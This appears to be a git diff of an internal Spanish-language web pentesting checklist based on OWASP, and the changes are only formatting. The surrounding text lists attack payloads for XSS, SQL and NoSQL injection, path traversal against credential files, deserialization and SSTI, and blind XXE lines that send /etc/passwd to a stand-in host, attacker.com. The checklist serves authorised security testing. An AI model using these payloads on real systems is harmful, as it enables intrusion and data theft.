@@ -3,7 +3,7 @@
 > **Estándares:** OWASP WSTG · OWASP Top 10 2021 · OWASP API Security Top 10 2023
 > **Nota:** Siempre que sea posible, utilizar al menos 2 cuentas durante las pruebas. Una con privilegios bajos y otra con privilegios de administración, para validar la escalada vertical. Para la escalada horizontal, usar 2 cuentas con el mismo rol.
 
----
+
 
 ## 📌 Etapa inicial — Recolección de información
 
@@ -116,7 +116,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   ```
 - [ ] Verificar si existen source maps (`.js.map`) expuestos — revelan el código fuente original.
 
----
+
 
 ## 📌 Access Control
 
@@ -183,7 +183,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   - Ejemplo: `?id=123&id=456` — algunos frameworks usan el primer valor y otros el último.
 - [ ] Probar también en el body de peticiones POST y en cabeceras cuando sean procesadas por múltiples componentes.
 
----
+
 
 ## 📌 API Testing
 
@@ -227,7 +227,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   - `"role": "admin"` · `"isAdmin": true` · `"isVerified": true` · `"credits": 9999`
 - [ ] Probar en endpoints de registro de usuario, actualización de perfil y creación de recursos.
 
----
+
 
 ## 📌 Autenticación
 
@@ -307,7 +307,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 - [ ] Verificar que el formulario de login transmite las credenciales siempre por HTTPS.
 - [ ] Verificar que la contraseña no se transmite ni almacena en logs, URLs o cabeceras.
 
----
+
 
 ## 📌 Clickjacking
 
@@ -319,7 +319,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 > 💡 **Recurso:** `clickjacking_poc.html` — Introduce la URL objetivo, pulsa "Mostrar iframe" y verifica si la página se carga dentro del iframe superpuesto al contenido señuelo.
 
----
+
 
 ## 📌 Cabeceras de Seguridad
 
@@ -377,7 +377,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 - [ ] Verificar que las páginas autenticadas incluyen cabeceras de caché restrictivas (`Cache-Control: no-store`).
 
----
+
 
 ## 📌 CSRF
 
@@ -426,7 +426,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   - **Dominio legítimo como subdominio** — `https://target.com.evil.com`
   - **Dominio legítimo como parámetro** — `https://evil.com/?target.com`
 
----
+
 
 ## 📌 XSS
 
@@ -466,7 +466,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 - [ ] Verificar XSS en SVG: `<svg onload=alert(1)>`
 - [ ] Verificar XSS en contexto de `href`: `javascript:alert(document.domain)`
 
----
+
 
 ## 📌 File Upload
 
@@ -536,7 +536,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 - [ ] Si la aplicación procesa SVG, XML o documentos Office en el servidor, verificar si es posible inyectar entidades externas XML (XXE).
 
----
+
 
 ## 📌 GraphQL
 
@@ -575,7 +575,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   ```
 - [ ] Probar bypass de rate limiting mediante aliases.
 
----
+
 
 ## 📌 Gestión de Sesiones
 
@@ -630,7 +630,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 > 💡 **Herramienta:** [jwt_tool](https://github.com/ticarpi/jwt_tool) · JWT Editor (plugin Burp)
 
----
+
 
 ## 📌 Host Header Attacks
 
@@ -659,7 +659,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 - [ ] Probar con valores que simulen acceso interno: `localhost`, `127.0.0.1`, `internal.target.com`, `admin.target.com`
 - [ ] Repetir el ataque usando las cabeceras alternativas del bloque 1.
 
----
+
 
 ## 📌 HTTP Request Smuggling
 
@@ -679,7 +679,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 - [ ] **TE.CL** — el frontend usa `Transfer-Encoding` y el backend usa `Content-Length`.
 - [ ] **TE.TE** — ambos soportan `Transfer-Encoding` pero uno puede ser confundido con ofuscación.
 
----
+
 
 ## 📌 Deserialización Insegura
 
@@ -719,7 +719,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   java -jar ysoserial.jar CommonsCollections6 'id' | base64
   ```
 
----
+
 
 ## 📌 NoSQL Injection
 
@@ -751,7 +751,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   {"username": "admin", "password": {"$regex": "^a"}}
   ```
 
----
+
 
 ## 📌 Command Injection
 
@@ -800,7 +800,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 > 💡 **Herramienta:** [commix](https://github.com/commixproject/commix)
 
----
+
 
 ## 📌 Path Traversal
 
@@ -855,16 +855,24 @@ Buscar información pública sobre el target sin interactuar directamente con la
 ### 9. Ficheros objetivo según el sistema operativo
 
 **Linux:**
+
+
 ```
 /etc/passwd · /etc/shadow · /proc/self/environ
 ~/.ssh/id_rsa · /var/log/apache2/access.log
+
+
 ```
 
 **Windows:**
+
+
 ```
 \windows\win.ini
 \windows\system32\drivers\etc\hosts
 \inetpub\wwwroot\web.config
+
+
 ```
 
 ### 10. Verificación del impacto
@@ -873,7 +881,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 - [ ] Intentar leer claves privadas SSH del usuario bajo el que corre el servidor web.
 - [ ] Verificar si el traversal permite escritura — si es así, escalar a RCE escribiendo un webshell.
 
----
+
 
 ## 📌 Prototype Pollution
 
@@ -918,7 +926,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
   {"__proto__": {"isAdmin": true}}
   ```
 
----
+
 
 ## 📌 SSRF
 
@@ -979,7 +987,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 - [ ] Verificar SSRF en XML (XXE → SSRF), SVG subidos y HTML procesado para generar PDFs.
 
----
+
 
 ## 📌 SSTI
 
@@ -1024,7 +1032,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 > 💡 **Herramienta:** [tplmap](https://github.com/epinna/tplmap)
 
----
+
 
 ## 📌 SQL Injection
 
@@ -1071,6 +1079,7 @@ Buscar información pública sobre el target sin interactuar directamente con la
 
 ### 5. Explotación con sqlmap
 
+
 ```bash
 # Detección básica GET
 sqlmap -u "https://target.com/item?id=1" --batch
@@ -1087,9 +1096,11 @@ sqlmap -u "https://target.com/item?id=1" -D nombre_db -T nombre_tabla --dump --b
 # Bypass de WAF
 sqlmap -u "https://target.com/item?id=1" --tamper=space2comment --batch
 sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --batch
+
+
 ```
 
----
+
 
 ## 📌 Transmisión Segura
 
@@ -1111,7 +1122,7 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
 - [ ] Verificar que los tokens de sesión, JWT y cookies de autenticación se transmiten únicamente por HTTPS.
 - [ ] Verificar que la información sensible no se transmite en la URL como query parameter.
 
----
+
 
 ## 📌 XXE
 
@@ -1152,28 +1163,38 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
 
 ### 6. XXE Blind — Parameter Entities
 
+
 ```xml
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "https://collaborator-id.oastify.com">
   %xxe;
 ]>
+
+
 ```
 
 ### 7. XXE Blind — Exfiltración via DTD externa
 
 **evil.dtd en servidor atacante:**
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>">
 %eval; %exfil;
+
+
 ```
 
 **Payload:**
+
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd"> %xxe;]>
+
+
 ```
 
 ### 8. XXE Blind — Mensajes de error
+
 
 ```xml
 <!DOCTYPE foo [
@@ -1181,17 +1202,23 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval; %error;
 ]>
+
+
 ```
 
 ### 9. XInclude para leer archivos
+
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
+
+
 ```
 
 ### 10. XXE via SVG
+
 
 ```xml
 <?xml version="1.0" standalone="yes"?>
@@ -1199,9 +1226,12 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&xxe;</text>
 </svg>
+
+
 ```
 
 ### 11. XXE usando DTD local
+
 
 ```xml
 <!DOCTYPE foo [
@@ -1213,11 +1243,13 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
   '>
   %local_dtd;
 ]>
+
+
 ```
 
 > 💡 **Tip:** DTDs locales comunes: `/usr/share/yelp/dtd/docbookx.dtd` · `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
 
----
+
 
 ## 📌 Web Cache Poisoning
 
@@ -1278,6 +1310,6 @@ sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --bat
   param=evil_payload_here
   ```
 
----
+
 
 *Web Application Pentesting Checklist · OWASP WSTG + OWASP Top 10 + OWASP API Security Top 10 · Uso interno*
